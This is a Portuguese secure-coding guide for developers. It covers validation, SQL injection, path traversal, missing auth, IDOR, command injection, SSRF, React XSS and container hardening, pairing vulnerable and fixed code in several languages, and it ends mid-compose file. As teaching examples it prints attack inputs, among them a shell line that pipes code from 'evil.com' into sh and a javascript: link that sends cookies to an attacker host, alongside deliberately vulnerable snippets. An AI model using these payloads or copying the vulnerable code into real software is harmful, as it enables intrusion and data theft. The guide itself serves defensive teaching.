# Dicas de Desenvolvimento Seguro


## Por que programar de forma segura

Quase toda falha explorada em aplicação web nasce de um mesmo erro: confiar em dado que veio do usuário. Este guia mostra as falhas mais comuns na nossa stack (Python, TypeScript, React, MySQL, Go, containers), como elas acontecem no código e o que checar antes de dar merge.

**Regra que resolve a maioria dos problemas:** tudo que chega de fora (parâmetro de URL, body, header, cookie, nome de arquivo, upload, dado de outro serviço) é hostil até ser validado. Validar significa checar tipo, formato, tamanho e faixa de valores, e nunca montar comando, query ou caminho concatenando esse dado.

**Por que importa para nós:** uma falha dessas em produção vira acesso indevido a dado de cliente, alteração de registro, execução de código no servidor ou queda de serviço. O custo de corrigir na revisão de código é minutos. O custo de corrigir depois de um incidente inclui investigação, comunicação, correção sob pressão e possível exposição de dados.

**Como usar este documento:** cada falha tem quatro partes: o que é, como acontece (código vulnerável), como corrigir (código seguro por linguagem) e o que validar na revisão. A seção Checklist de PR no final resume tudo em perguntas objetivas. O documento cresce: novas falhas entram seguindo o mesmo formato.

## Por onde começar: mapa por trecho de código

Não é preciso ler o guia inteiro. Ache abaixo a linha que descreve o que o seu código está fazendo, faça a checagem rápida e, se ficou em dúvida, abra só a seção indicada. Se nenhuma linha bate com o que você está escrevendo, provavelmente não tem entrada externa envolvida e o risco é baixo.

| Seu código faz isso                                              | Falha provável                  | Checagem rápida                                                                    | Seção                             |
| ---------------------------------------------------------------- | ------------------------------- | ---------------------------------------------------------------------------------- | --------------------------------- |
| Recebe qualquer dado de request, header, cookie, fila ou webhook | Entrada sem contrato            | Existe schema (Pydantic, zod, struct) que rejeita campo desconhecido?              | [Validação de entrada](#validação-de-entrada-a-base-de-tudo)              |
| Monta uma query SQL usando valor que veio de request             | SQL Injection                   | O valor entra por placeholder (`?` ou `%s`) e não por string?                      | [SQL Injection](#sql-injection)                     |
| Deixa o usuário escolher coluna, tabela ou ordem do resultado    | SQL Injection                   | O valor recebido é comparado com uma lista fixa no código?                         | [SQL Injection](#sql-injection)                     |
| Abre, lê, grava ou envia um arquivo cujo nome veio de fora       | Path Traversal                  | O caminho final é resolvido e conferido contra a pasta base?                       | [Path Traversal](#path-traversal)                    |
| Recebe upload                                                    | Path Traversal                  | O arquivo é gravado com nome gerado pela aplicação, fora da raiz web?              | [Path Traversal](#path-traversal)                    |
| Cria rota, endpoint ou handler novo                              | Rota sem auth                   | A rota está coberta pelo middleware global, ou está na lista pública de propósito? | [Rota sem autenticação](#rota-sem-autenticação)             |
| Escreve serviço interno que outro serviço chama                  | Rota sem auth                   | Ele exige credencial de serviço mesmo sem porta publicada?                         | [Rota sem autenticação](#rota-sem-autenticação), [Containers](#falhas-de-serviços-em-containers) |
| Busca, altera ou apaga um registro por id                        | IDOR                            | A query filtra também por `owner_id` ou `org_id` do usuário logado?                | [IDOR](#idor-insecure-direct-object-reference)                              |
| Recebe JSON e grava direto no banco (create ou update)           | IDOR (mass assignment)          | Existe schema com só os campos que o usuário pode enviar?                          | [IDOR](#idor-insecure-direct-object-reference)                              |
| Chama um binário, script ou comando do sistema                   | Command Injection               | Argumentos em lista, regex fechada, `timeout`, sem `shell=True`?                   | [Command Injection](#command-injection)                 |
| Faz requisição HTTP para URL que veio do usuário                 | SSRF                            | Host em allowlist, ou esquema e IP validados e redirect desligado?                 | [SSRF](#ssrf-server-side-request-forgery)                              |
| Renderiza HTML, markdown ou texto rico vindo do usuário no React | XSS                             | Passou por DOMPurify antes do `dangerouslySetInnerHTML`?                           | [XSS no front](#xss-no-front-react)                      |
| Coloca URL vinda do usuário em `href`, `src` ou redirect         | XSS                             | O esquema foi validado como `http` ou `https`?                                     | [XSS no front](#xss-no-front-react)                      |
| Monta HTML ou e-mail em Go com template                          | XSS                             | É `html/template` e não `text/template`?                                           | [XSS no front](#xss-no-front-react)                      |
| Escreve ou altera Dockerfile ou compose                          | Container mal configurado       | Tem `USER` não root, sem segredo na imagem, `ports:` só no que é público?          | [Containers](#falhas-de-serviços-em-containers)                        |
| Precisa de senha, chave ou token dentro da aplicação             | Segredo exposto                 | Vem de variável de ambiente ou secret, e não do código ou da imagem?               | [Segredos e configuração](#segredos-configuração-e-dependências)           |
| Trata erro ou exceção que volta para o cliente                   | Erro verboso                    | O cliente recebe mensagem genérica e o detalhe fica só no log?                     | [Segredos e configuração](#segredos-configuração-e-dependências)           |
| Grava ou confere senha de usuário                                | Hash fraco                      | Usa bcrypt ou argon2 da biblioteca padrão?                                         | [Segredos e configuração](#segredos-configuração-e-dependências)           |
| Adiciona ou atualiza dependência                                 | Pacote vulnerável               | Lockfile atualizado e audit do CI sem severidade alta?                             | [Segredos e configuração](#segredos-configuração-e-dependências)           |
| Escreve log                                                      | Vazamento em log                | O log não grava senha, token, cookie ou documento?                                 | [Segredos e configuração](#segredos-configuração-e-dependências)           |
| Escreve handler de login, de erro 401/403/404 ou de validação    | Ataque invisível para o SOC     | Emite evento JSON nomeado com os campos base?                                      | [O que logar para o SOC](#o-que-logar-para-o-soc-enxergar-o-ataque)            |
| Vai abrir o PR                                                   | Falha que o revisor não vai ver | Rodou os três curls e escreveu os testes 401 e 404?                                | [Como testar você mesmo](#como-testar-você-mesmo-antes-do-pr)            |
| Não sabe se a falha encontrada trava o merge                     | Prioridade errada               | Consultou a tabela de severidade?                                                  | [Severidade](#severidade-o-que-trava-o-deploy-e-o-que-vira-ticket)                        |

**Atalho para quem tem pressa:** antes de abrir o PR, passe só pelo Checklist de revisão de código no final. Se alguma resposta for "não", a seção correspondente explica o porquê e mostra o código corrigido.

<h2 id="validação-de-entrada-a-base-de-tudo">Validação de entrada: a base de tudo <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** conferir cada dado que chega de fora antes de usar. Tipo (é número?), formato (é e-mail? é UUID?), tamanho (até 100 caracteres?) e faixa (entre 1 e 1000?). O que não passa é rejeitado com 400, sem tentar "consertar".

**No dia a dia do dev:** é tipagem em runtime. O TypeScript garante o tipo em compilação, mas o JSON que chega no request é `any` de verdade. O schema é o contrato da API: o que não está nele não entra. Toda falha deste guia começa com um dado que passou sem contrato.

### O que conta como dado externo

A lista é maior do que parece. Tudo isto é hostil até ser validado:

- Query string, path param, body JSON e form.
- Header (`User-Agent`, `X-Forwarded-For`, `Referer`) e cookie.
- Claim de JWT: a assinatura garante que não foi alterado, não que o conteúdo é seguro.
- Nome, extensão e conteúdo de upload.
- Webhook e callback de terceiros (gateway de pagamento, OAuth).
- Mensagem de fila (Redis, RabbitMQ, SQS) produzida por outro serviço.
- Resposta de API externa.
- Dado que já está no banco mas foi gravado por um usuário. Um nome de perfil com `<script>` gravado hoje vira XSS no relatório de amanhã. Isso se chama injection de segunda ordem: validar na entrada e escapar na saída, sempre os dois.

### Código seguro

Python (Pydantic, funciona com FastAPI e Flask):

```python
from pydantic import BaseModel, EmailStr, Field

class CreateUser(BaseModel):
    email: EmailStr
    name: str = Field(min_length=1, max_length=100)
    age: int = Field(ge=0, le=150)

    model_config = {"extra": "forbid"}   # campo desconhecido = 400

user = CreateUser(**request.get_json())  # ValidationError vira 400
```

TypeScript (zod):

```typescript
import { z } from "zod";

const CreateUser = z.object({
  email: z.string().email(),
  name: z.string().min(1).max(100),
  age: z.number().int().min(0).max(150),
}).strict();   // campo desconhecido = erro

const parsed = CreateUser.safeParse(req.body);
if (!parsed.success) return res.status(400).json(parsed.error.flatten());
const user = parsed.data;   // tipado e validado
```

Go (struct + validator):

```go
type CreateUser struct {
    Email string `json:"email" validate:"required,email"`
    Name  string `json:"name"  validate:"required,min=1,max=100"`
    Age   int    `json:"age"   validate:"gte=0,lte=150"`
}

dec := json.NewDecoder(r.Body)
dec.DisallowUnknownFields()
var in CreateUser
if err := dec.Decode(&in); err != nil { http.Error(w, "bad request", 400); return }
if err := validate.Struct(in); err != nil { http.Error(w, "bad request", 400); return }
```

**Regras que acompanham:**

- Allowlist, nunca blocklist. Dizer o que pode (`^[a-z0-9_]{3,20}$`) é finito; dizer o que não pode nunca termina.
- Rejeitar, não sanitizar. Remover `<script>` de um campo deixa `<scr<script>ipt>` passar. Se o dado não bate com o formato, é 400.
- Campo desconhecido é erro. É o que impede mass assignment (ver IDOR).
- Validar na borda (handler), uma vez, e confiar dali para dentro. Validação espalhada em cada função é o que gera o esquecimento.
- Limite de tamanho no body inteiro (1 MB é bom padrão para JSON) e no upload, no framework ou no proxy.

### O que validar na revisão

- Todo handler tem schema declarado; nenhum acessa `request.json["x"]` ou `req.body.x` direto.
- Schema rejeita campo desconhecido.
- String tem tamanho máximo; número tem faixa; enum tem lista fixa.
- Dado lido do banco e renderizado ou concatenado passa pelo mesmo tratamento que dado de request.

<h2 id="sql-injection">SQL Injection <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** o dado do usuário vira parte do comando SQL em vez de ser tratado como valor. O atacante altera a lógica da query: lê tabelas que não deveria, ignora autenticação, apaga ou altera registros.

**No dia a dia do dev:** é o mesmo que dar `eval()` em uma string que veio do request. Você escreveu `WHERE email = '...'` pensando em um valor; o usuário fechou a aspa e continuou escrevendo SQL no seu lugar. O banco não distingue quem escreveu o quê, ele só executa. Placeholder é a forma de dizer ao driver "isto aqui é dado, não é comando".

**Como acontece:** a query é montada por concatenação ou f-string. O banco não sabe onde termina o SQL do dev e onde começa o dado do usuário.

**Exemplo de ataque:** o campo `email` de um login recebe `' OR '1'='1' --` . A query vira `SELECT * FROM users WHERE email = '' OR '1'='1' -- ' AND password = '...'` e retorna o primeiro usuário da tabela sem senha válida.

### Código vulnerável

Python:

```python
cursor.execute(f"SELECT * FROM users WHERE email = '{email}'")
```

TypeScript (mysql2):

```typescript
const rows = await conn.query(`SELECT * FROM users WHERE email = '${email}'`);
```

Go:

```go
rows, err := db.Query("SELECT * FROM users WHERE email = '" + email + "'")
```

### Código seguro

A correção é sempre a mesma: query parametrizada. O SQL vai fixo, o valor vai separado, e o driver garante que ele é tratado como dado.

Python (mysql-connector ou PyMySQL):

```python
cursor.execute("SELECT * FROM users WHERE email = %s", (email,))
```

TypeScript (mysql2):

```typescript
const [rows] = await conn.execute("SELECT * FROM users WHERE email = ?", [email]);
```

Go:

```go
rows, err := db.Query("SELECT * FROM users WHERE email = ?", email)
```

**Atenção com ORM:** SQLAlchemy, Prisma, TypeORM e GORM parametrizam por padrão nas chamadas normais. O risco volta quando se usa `text()`, `$queryRawUnsafe`, `query()` com string ou `db.Raw()` com concatenação. Nesses casos, aplicar a mesma regra: placeholder e parâmetro separado.

**Nome de tabela, coluna e ORDER BY não aceitam placeholder.** Se o usuário escolhe a coluna de ordenação, validar contra uma lista fixa no código e nunca inserir o valor recebido direto.

### O que validar na revisão

- Nenhuma query montada com f-string, template string, `+` ou `format()`.
- Chamadas raw do ORM usam placeholder e parâmetro separado.
- Coluna, tabela e direção de ordenação vindas do usuário passam por lista de valores permitidos.
- O usuário do banco usado pela aplicação não tem `DROP`, `FILE` ou acesso a outros schemas.

<h2 id="path-traversal">Path Traversal <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** o usuário controla parte de um caminho de arquivo e usa `../` para sair da pasta prevista. Resultado: leitura de `/etc/passwd`, `.env`, chaves privadas, código-fonte, ou escrita de arquivo em lugar arbitrário (upload que vira shell).

**No dia a dia do dev:** você faz `cd uploads` e depois `cat <nome>`. Se o nome for `../../.env`, o `cat` lê o `.env`. `os.path.join` e `path.join` funcionam exatamente como o shell: eles resolvem o `..` e não perguntam se você queria sair da pasta. O nome do arquivo que o usuário mandou é o argumento do seu `cat`.

**Como acontece:** o nome do arquivo recebido é juntado direto com a pasta base. `os.path.join("/app/uploads", "../../etc/passwd")` resolve para `/etc/passwd`. Bloquear a string `../` não resolve: existem variações codificadas (`%2e%2e%2f`, `..%5c`, `....//`) e caminho absoluto (`/etc/passwd` sobrescreve a base no `join`).

**Exemplo de ataque:** `GET /download?file=../../../../etc/passwd` ou `GET /download?file=..%2F..%2F.env`.

### Código vulnerável

Python:

```python
path = os.path.join(UPLOAD_DIR, request.args["file"])
return send_file(path)
```

TypeScript (Express):

```typescript
res.sendFile(path.join(UPLOAD_DIR, req.query.file as string));
```

Go:

```go
http.ServeFile(w, r, filepath.Join(uploadDir, r.URL.Query().Get("file")))
```

### Código seguro

Duas defesas, usar as duas: resolver o caminho final e confirmar que ele continua dentro da pasta base; e, quando possível, nem aceitar nome de arquivo do usuário (aceitar um id e mapear para o nome no banco).

Python:

```python
base = Path(UPLOAD_DIR).resolve()
target = (base / request.args["file"]).resolve()
if not target.is_relative_to(base):
    abort(400)
return send_file(target)
```

TypeScript:

```typescript
const base = path.resolve(UPLOAD_DIR);
const target = path.resolve(base, req.query.file as string);
if (!target.startsWith(base + path.sep)) return res.sendStatus(400);
res.sendFile(target);
```

Go:

```go
name := filepath.Clean("/" + r.URL.Query().Get("file"))
target := filepath.Join(uploadDir, name)
if !strings.HasPrefix(target, uploadDir+string(os.PathSeparator)) {
    http.Error(w, "bad request", 400)
    return
}
http.ServeFile(w, r, target)
```

**Upload:** nunca usar o nome enviado pelo cliente para gravar em disco. Gerar nome próprio (UUID), validar extensão contra lista fixa, checar o tipo real do conteúdo, gravar fora da raiz web e nunca em pasta executável.

### O que validar na revisão

- Todo caminho montado com dado externo passa por resolve/clean e checagem de prefixo contra a base.
- Nome de arquivo do usuário não chega ao filesystem; usa id e lookup no banco.
- Upload grava com nome gerado pela aplicação e extensão validada.
- Bloqueio por blacklist de `../` sozinho é reprovado.

<h2 id="rota-sem-autenticação">Rota sem autenticação <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** um endpoint que deveria exigir login responde para qualquer requisição. O front esconde o botão, mas a API está aberta. Quem chama a URL direto (curl, Burp, script) recebe o dado ou executa a ação.

**No dia a dia do dev:** esconder o botão "Exportar" no React para quem não é admin é como tirar o item do menu. A API é a porta, e ela continua lá. Qualquer um abre o DevTools, vê a chamada `GET /api/users/export` e repete no curl. Autorização mora no backend; o front só decide o que mostrar.

**Como acontece:** o middleware de auth é aplicado rota por rota e alguém esquece uma; um endpoint novo é criado copiando outro que era público; uma rota de debug ou de admin sobe para produção; um serviço interno em Go é exposto sem nenhuma checagem porque "só a API principal chama ele".

**Exemplo de ataque:** o atacante lista as rotas pelo bundle do React ou pelo OpenAPI e chama `GET /api/admin/users` sem token. Se voltar 200, acabou.

### Código vulnerável

TypeScript (Express):

```typescript
app.get("/api/users", requireAuth, listUsers);
app.get("/api/users/export", exportUsers); // esqueceram o requireAuth
```

Python (Flask):

```python
@app.route("/api/reports")
def reports():  # sem @login_required
    return jsonify(load_reports())
```

Go:

```go
mux.HandleFunc("/internal/reindex", reindexHandler) // nenhuma checagem
```

### Código seguro

Inverter o padrão: autenticação é o default para tudo, e rota pública é exceção declarada explicitamente.

TypeScript (Express):

```typescript
const PUBLIC = new Set(["/api/health", "/api/login"]);
app.use((req, res, next) => PUBLIC.has(req.path) ? next() : requireAuth(req, res, next));
```

Python (Flask):

```python
@app.before_request
def enforce_auth():
    if request.endpoint in PUBLIC_ENDPOINTS:
        return
    if not current_user_is_authenticated():
        abort(401)
```

Go:

```go
handler := requireAuth(mux)   // envolve o mux inteiro
http.ListenAndServe(":8080", handler)
```

**Serviço interno (Go):** não existe "só a API chama". Exigir token de serviço (mTLS ou bearer fixo por serviço via secret) e escutar só na interface interna. Ver a seção de containers.

**Não esquecer:** verbos diferentes na mesma rota (`GET` protegido, `PUT` aberto), rotas de health/metrics que vazam dado, e endpoints de "esqueci a senha" e "registro" sem rate limit.

### O que validar na revisão

- Auth aplicada globalmente; lista de rotas públicas é explícita e pequena.
- Toda rota nova está coberta por teste que chama sem token e espera 401.
- Nenhuma rota de debug, admin ou interna exposta no mesmo listener da API pública.
- Serviço interno exige credencial de serviço mesmo dentro da rede.

<h2 id="idor-insecure-direct-object-reference">IDOR (Insecure Direct Object Reference) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** o usuário está logado, mas troca o id na URL ou no body e acessa um objeto que não é dele. `GET /api/invoices/1042` vira `GET /api/invoices/1043` e devolve a fatura de outro cliente. É o erro de autorização mais comum em API e o mais fácil de explorar: não precisa de ferramenta, só de mudar um número.

**No dia a dia do dev:** é o `AND owner_id = ?` que faltou no `WHERE`. Pense em um link de Google Drive "qualquer pessoa com o link pode ver": o link é a autenticação (você entrou), mas o documento não confere se você deveria estar ali. Todo `findById` sem filtro de dono é esse link.

**Autenticação não é autorização.** Autenticação responde "quem é você". Autorização responde "você pode mexer nisso". A rota pode ter auth perfeita e ainda ter IDOR, porque checou o login e não checou o dono.

**Como acontece:** o handler recebe o id, busca no banco e retorna. Ninguém compara o dono do registro com o usuário da sessão. Variantes: id sequencial facilita enumeração; id em campo do body (`"user_id": 7`) é aceito e sobrescreve o usuário logado; endpoint de update aceita campos que o usuário não deveria alterar (`role`, `is_admin`, `price`), o que se chama mass assignment.

### Código vulnerável

Python (Flask + SQLAlchemy):

```python
@app.route("/api/invoices/<int:id>")
@login_required
def get_invoice(id):
    return jsonify(Invoice.query.get_or_404(id))
```

TypeScript (Express + Prisma):

```typescript
const invoice = await prisma.invoice.findUnique({ where: { id: Number(req.params.id) } });
res.json(invoice);
```

Go:

```go
row := db.QueryRow("SELECT * FROM invoices WHERE id = ?", id)
```

### Código seguro

O filtro de dono entra na própria query. Nunca buscar o objeto e depois "lembrar" de checar.

Python:

```python
invoice = Invoice.query.filter_by(id=id, owner_id=current_user.id).first_or_404()
```

TypeScript:

```typescript
const invoice = await prisma.invoice.findFirst({
  where: { id: Number(req.params.id), ownerId: req.user.id },
});
if (!invoice) return res.sendStatus(404);
```

Go:

```go
row := db.QueryRow("SELECT * FROM invoices WHERE id = ? AND owner_id = ?", id, userID)
```

**Regras que acompanham:**

- O id do usuário vem sempre da sessão ou do token, nunca do body ou da query string.
- Update e delete recebem só os campos editáveis (schema explícito com Pydantic, zod ou struct dedicada); o resto é ignorado.
- Responder 404 e não 403 quando o objeto existe mas não é do usuário. 403 confirma que o id existe.
- Para recurso compartilhado (equipe, empresa), a checagem é de participação: o usuário faz parte da organização dona do objeto.
- UUID no lugar de id sequencial dificulta enumeração, mas não substitui a checagem de dono.

### O que validar na revisão

- Toda query que recebe id externo filtra também por dono ou organização.
- Nenhum handler aceita `user_id`, `owner_id`, `org_id` vindo do cliente.
- Update usa schema de campos permitidos; `role`, `status` de pagamento e similares não entram.
- Existe teste que acessa o objeto de outro usuário e espera 404.

<h2 id="command-injection">Command Injection <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** dado do usuário vira parte de um comando executado no sistema operacional. É o SQL Injection com o shell no lugar do banco. O atacante encadeia comandos com `;`, `&&`, `|` ou `$( )` e executa o que quiser com o usuário do processo. Resultado direto: RCE, execução remota de código no servidor.

**No dia a dia do dev:** `os.system(f"ping -c 1 {host}")` parece só um ping. Se `host` for `8.8.8.8; curl evil.com/x.sh | sh`, o shell roda o ping e depois roda o resto. Todo lugar onde você chamaria um binário externo (ImageMagick, ffmpeg, git, zip, nmap, um script legado) é candidato.

**Como acontece:** uso de `shell=True`, `exec()` do Node, `os.system`, `sh -c` com string montada. Mesmo sem shell, passar o dado como argumento sem validar permite injeção de flag (`--output=/etc/cron.d/x`).

### Código vulnerável

Python:

```python
subprocess.run(f"convert {filename} -resize 100x100 thumb.png", shell=True)
```

TypeScript (Node):

```typescript
exec(`git clone ${repoUrl} /tmp/repo`, callback);
```

Go:

```go
exec.Command("sh", "-c", "tar -czf backup.tgz "+dir).Run()
```

### Código seguro

Três regras, nesta ordem: (1) não chame o shell, chame o binário com argumentos em lista; (2) valide o argumento contra formato fechado; (3) se existe biblioteca nativa para a tarefa, use ela e não chame binário nenhum.

Python:

```python
if not re.fullmatch(r"[a-zA-Z0-9_.-]{1,64}", filename):
    abort(400)
subprocess.run(["convert", filename, "-resize", "100x100", "thumb.png"], check=True, timeout=30)
```

TypeScript (Node):

```typescript
if (!/^https:\/\/github\.com\/[\w.-]+\/[\w.-]+$/.test(repoUrl)) return res.sendStatus(400);
execFile("git", ["clone", "--", repoUrl, "/tmp/repo"], callback);
```

Go:

```go
if !validDir.MatchString(dir) { http.Error(w, "bad request", 400); return }
exec.Command("tar", "-czf", "backup.tgz", "--", dir).Run()
```

O `--` antes do argumento impede que um valor começando com `-` seja lido como flag.

**Cuidados extras:** `timeout` em toda chamada externa; rodar o binário com usuário sem privilégio; nunca passar dado externo para `eval`, `exec` (Python), `Function`, `vm.runInNewContext` (Node) ou `template.Must(template.New().Parse(dado))` (Go).

### O que validar na revisão

- Nenhum `shell=True`, `exec()` com string, `sh -c` ou `os.system` com dado externo.
- Argumento passa por regex fechada antes de chegar ao binário.
- Chamada externa tem `timeout`.
- Se existe lib nativa (Pillow, sharp, archive/zip), o binário não é chamado.

<h2 id="ssrf-server-side-request-forgery">SSRF (Server-Side Request Forgery) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** o servidor faz uma requisição HTTP para uma URL que o usuário escolheu. O atacante aponta para endereços que só o servidor alcança: serviços internos (`http://db-admin:8080`), o próprio serviço Go interno sem auth, o endpoint de metadata da nuvem (`http://169.254.169.254/`, que entrega credenciais da instância) ou `localhost`.

**No dia a dia do dev:** "buscar imagem por URL", "importar de link", "preview de link", "webhook de teste", "proxy de avatar". Em todos, o seu backend vira o navegador do atacante dentro da rede interna. Ele não consegue chegar no `redis:6379`, mas a sua API consegue, e ele manda a sua API ir lá.

**Como acontece:** `requests.get(url)`, `fetch(url)`, `http.Get(url)` com `url` vindo do request. Checar só o hostname não basta: o atacante usa `http://127.0.0.1`, `http://[::1]`, `http://0x7f000001`, DNS que resolve para IP interno, ou redirect 302 de um domínio válido para um interno.

### Código vulnerável

Python:

```python
resp = requests.get(request.json["image_url"])
```

TypeScript:

```typescript
const resp = await fetch(req.body.url);
```

Go:

```go
resp, err := http.Get(r.URL.Query().Get("url"))
```

### Código seguro

Defesa em camadas, porque nenhuma sozinha fecha todos os casos:

1. Se a lista de destinos é conhecida (três provedores de imagem, dois parceiros), allowlist de host e pronto. Este é o caso da maioria das features.
2. Se tem que aceitar URL arbitrária: só `http` e `https`; resolver o DNS e recusar IP privado, loopback, link-local e reservado; não seguir redirect automaticamente (ou revalidar cada salto); timeout curto; limitar o tamanho da resposta.
3. Na rede: o container da API não deve alcançar metadata da nuvem nem serviços que não usa (ver Containers).

Python:

```python
import ipaddress, socket
from urllib.parse import urlparse

def safe_get(url: str):
    p = urlparse(url)
    if p.scheme not in ("http", "https") or not p.hostname:
        abort(400)
    for info in socket.getaddrinfo(p.hostname, None):
        ip = ipaddress.ip_address(info[4][0])
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            abort(400)
    return requests.get(url, timeout=5, allow_redirects=False, stream=True)
```

TypeScript:

```typescript
import dns from "node:dns/promises";
import ipaddr from "ipaddr.js";

async function safeFetch(raw: string) {
  const u = new URL(raw);
  if (!["http:", "https:"].includes(u.protocol)) throw new Error("scheme");
  const addrs = await dns.lookup(u.hostname, { all: true });
  for (const a of addrs) {
    if (ipaddr.parse(a.address).range() !== "unicast") throw new Error("private");
  }
  return fetch(u, { redirect: "manual", signal: AbortSignal.timeout(5000) });
}
```

Go:

```go
func safeGet(raw string) (*http.Response, error) {
    u, err := url.Parse(raw)
    if err != nil || (u.Scheme != "http" && u.Scheme != "https") {
        return nil, errors.New("bad url")
    }
    ips, err := net.LookupIP(u.Hostname())
    if err != nil { return nil, err }
    for _, ip := range ips {
        if ip.IsPrivate() || ip.IsLoopback() || ip.IsLinkLocalUnicast() || ip.IsUnspecified() {
            return nil, errors.New("private address")
        }
    }
    client := &http.Client{
        Timeout: 5 * time.Second,
        CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
    }
    return client.Get(u.String())
}
```

**Atenção:** existe uma janela entre resolver o DNS na checagem e resolver de novo na requisição (DNS rebinding). Para feature de alto risco, fixar o IP validado no client ou usar um proxy de saída dedicado que aplica a mesma regra.

### O que validar na revisão

- Toda chamada HTTP com URL externa tem allowlist de host ou passa por checagem de esquema e IP.
- Redirect não é seguido automaticamente.
- Timeout e limite de tamanho de resposta definidos.
- Rede do container não alcança metadata da nuvem nem serviços que a feature não usa.

<h2 id="xss-no-front-react">XSS no front (React) <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** dado de usuário renderizado como HTML ou JavaScript no navegador de outra pessoa. O atacante rouba sessão, faz requisições em nome da vítima ou altera a página.

**No dia a dia do dev:** o campo de comentário do usuário vira código que roda no navegador de outra pessoa, com a sessão dela. É como copiar um snippet de fórum e colar direto no console sem ler. `{texto}` no JSX é seguro porque o React trata como string; `dangerouslySetInnerHTML` tem esse nome porque você está dizendo "confio, pode executar".

**Como acontece no React:** o JSX escapa texto por padrão, então `<p>{comentario}</p>` é seguro. O problema aparece em três pontos onde o React deixa o escape de lado.

### Código vulnerável

1. `dangerouslySetInnerHTML` com dado externo:

```tsx
<div dangerouslySetInnerHTML={{ __html: post.body }} />
```

2. URL controlada pelo usuário em `href` ou `src`:

```tsx
<a href={user.website}>site</a>   // user.website = "javascript:fetch('https://evil/?c='+document.cookie)"
```

3. Dado inserido fora do React: `innerHTML`, `document.write`, `eval`, `new Function`, ou template de terceiros (gráficos, editores de texto rico) que aceitam HTML.

### Código seguro

1. Renderizar como texto sempre que possível. Se precisa de HTML (editor rico, markdown), sanitizar antes com DOMPurify:

```tsx
import DOMPurify from "dompurify";
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }} />
```

2. Validar o esquema da URL antes de usar em `href`:

```tsx
const safeUrl = (u: string) => /^https?:\/\//i.test(u) ? u : "#";
<a href={safeUrl(user.website)} rel="noopener noreferrer">site</a>
```

3. Backend com `Content-Security-Policy` que bloqueia script inline e origem desconhecida. Reduz o impacto mesmo quando o front falha.

**Cookie de sessão:** `HttpOnly`, `Secure`, `SameSite=Lax` ou `Strict`. Token em `localStorage` é lido por qualquer XSS; em cookie `HttpOnly` não é.

**Template em Go:** `html/template` escapa automaticamente conforme o contexto (HTML, atributo, URL, JS). `text/template` não escapa nada. Se o serviço em Go monta HTML, e-mail ou página de erro com dado externo, tem que ser `html/template`. Trocar um pelo outro é um `import` de diferença e passa fácil em revisão.

### O que validar na revisão

- Todo `dangerouslySetInnerHTML` tem sanitização na mesma linha ou é reprovado.
- `href`, `src` e `action` com dado externo passam por checagem de esquema `http(s)`.
- Nenhum uso de `innerHTML`, `eval` ou `new Function` com dado externo.
- CSP configurada no backend; sessão em cookie `HttpOnly`.

<h2 id="falhas-de-serviços-em-containers">Falhas de serviços em containers <a href="#por-onde-começar-mapa-por-trecho-de-código" title="Voltar à tabela de navegação">↩</a></h2>

**O que é:** o código pode estar correto e o serviço ainda ser comprometido pela forma como roda. Container mal configurado transforma uma falha pequena na aplicação (RCE, path traversal, SSRF) em acesso ao host ou a outros serviços.

**No dia a dia do dev:** container é um quarto, não uma casa. Rodar como root é deixar a chave do prédio dentro do quarto; montar o `docker.sock` é deixar a chave de todos os quartos. Um RCE na sua API vira, com essas duas coisas, controle do host onde rodam os outros serviços. A configuração do container define o tamanho do estrago de qualquer falha de código.

**Como acontece:** a imagem roda como root, expõe porta que não precisava, carrega segredo dentro dela, monta o socket do Docker ou nunca é atualizada. O atacante que consegue executar um comando dentro do container encontra tudo isso pronto.

### As falhas mais comuns

|Falha|O que o atacante ganha|Correção|
|---|---|---|
|Processo roda como root|Qualquer RCE vira root no container; escape fica mais fácil|`USER app` no Dockerfile; usuário sem shell e sem home gravável|
|`/var/run/docker.sock` montado|Controle total do host (cria container privilegiado, monta `/`)|Nunca montar em container de aplicação|
|`--privileged` ou `cap-add` genérico|Acesso a dispositivos e kernel do host|Remover; adicionar só a capability necessária, se houver|
|Segredo dentro da imagem (`COPY .env`, `ENV DB_PASS=`)|Quem baixa a imagem ou lê o histórico de layers tem a senha|Segredo por variável em runtime, secret do orquestrador ou vault; `.dockerignore` com `.env`, `.git`, chaves|
|Serviço interno escutando em `0.0.0.0` e porta publicada|Serviço Go "interno" acessível de fora ou de qualquer container na rede|Sem `ports:` no compose; escutar na rede interna; exigir credencial de serviço|
|Banco exposto na rede pública (`3306:3306`)|Brute force direto no MySQL|Publicar porta só se necessário e só em interface interna; senha forte; usuário com privilégio mínimo|
|Imagem base antiga (`python:3.9`, `node:16`)|CVEs conhecidas em libs do sistema|Base atualizada e slim; scanner de imagem no CI (Trivy, Grype)|
|Sem limite de CPU e memória|Um serviço derrubado leva os outros junto|`mem_limit`, `cpus` ou `resources` no orquestrador|
|Filesystem gravável|Atacante persiste binário ou altera código|`read_only: true` com `tmpfs` só onde precisa escrever|
|Rede padrão compartilhada por tudo|Container comprometido enxerga todos os outros|Uma rede por conjunto de serviços; front não fala com banco direto|

### Dockerfile de referência

```dockerfile
FROM python:3.12-slim
RUN useradd --system --no-create-home --shell /usr/sbin/nologin app
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY --chown=app:app . .
USER app
EXPOSE 8000
CMD ["gunicorn", "-b", "0.0.0.0:8000", "app:app"]
```

O `0.0.0.0` dentro do container é normal; quem controla o que sai é o `ports:` do compose e a rede.

### Compose de referência

```yaml
services:
  api:
    build: .
    read_only: true
    tmpfs: [/tmp]
    environment:
      DB_PASS_FILE: /run/secrets/db_pass
    secrets: [db_pass]
    networks: [front, back]
